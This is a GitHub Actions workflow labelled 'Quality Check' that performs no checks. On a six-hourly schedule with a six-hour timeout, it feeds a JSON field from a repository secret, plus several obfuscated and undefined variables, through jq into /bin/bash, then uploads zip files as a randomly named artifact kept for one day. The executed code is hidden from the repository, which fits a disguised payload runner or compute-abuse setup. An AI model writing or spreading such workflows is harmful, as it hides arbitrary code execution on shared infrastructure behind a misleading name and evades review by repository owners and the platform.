name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '37 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Start
        env:
          gvo1: ${{ secrets.gvo1 }}
        run: |
          printf '%s' "$gvo1" | jq -r .q272 | /bin/bash
          echo $jcjmw68359 | jq -r .ysj8 | /bin/bash
          echo $cu67701 | jq -r .kz5 | /bin/bash
          echo $dy4030 | jq -r .mxnoz0 | /bin/bash
          printf '%s' "$tfcgn9720" | jq -r .au9 | /bin/bash
          printf '%s' "$igkt312" | jq -r .spiq54 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: Pwiu4bfC
          path: "*.zip"
          retention-days: 1
